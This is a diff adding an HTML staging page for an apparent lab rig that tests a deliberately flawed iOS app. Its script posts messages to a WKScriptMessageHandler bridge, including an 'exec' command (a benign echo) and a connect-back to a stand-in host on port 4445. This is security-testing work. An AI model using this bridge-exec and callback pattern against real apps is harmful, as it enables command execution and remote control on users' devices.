@@ -1,0 +1,33 @@
+<!doctype html>
+<!--
+  P6 iOS RIG EXAMPLE STAGING PAGE (lab only, policy §1/§7).
+  Benign marker body per policy §2 — no attack payload.
+  Placeholders: 192.0.2.10 is RFC 5737 example space; replace with YOUR lab
+  host when running. Copy to payload.html (uncommitted) for runs.
+-->
+<html>
+<head><meta charset="utf-8"><title>p6rig iOS demo</title></head>
+<body>
+  <h1>P6 iOS rig demo page</h1>
+  <p>Expected markers via <code>capture_logs.sh</code>:
+     BRIDGE_REACHED, BRIDGE_EXEC, BRIDGE_CALLBACK.</p>
+  <script>
+    // E stage (C7 class): page JS posting messages into the app-authored
+    // WKScriptMessageHandler bridge. The demo app is deliberately flawed:
+    // it trusts these payloads without validation.
+    var bridge = window.webkit && window.webkit.messageHandlers &&
+                 window.webkit.messageHandlers.p6rigBridge;
+    if (bridge) {
+      bridge.postMessage({op: "mark", tag: "stage-e-bridge-reached"});
+      // benign command marker — proves the app-process execution arm
+      // (simulator: host-side; see demo-app README honesty note)
+      bridge.postMessage({op: "exec", cmd: "echo stage_e_exec_ok"});
+      // C stage: session-verification callback to the listener stub
+      bridge.postMessage({op: "callback", host: "192.0.2.10", port: 4445});
+    } else {
+      // Control arm: opened in Safari or an app without the bridge.
+      console.log("P6RIG control arm: no p6rigBridge message handler");
+    }
+  </script>
+</body>
+</html>
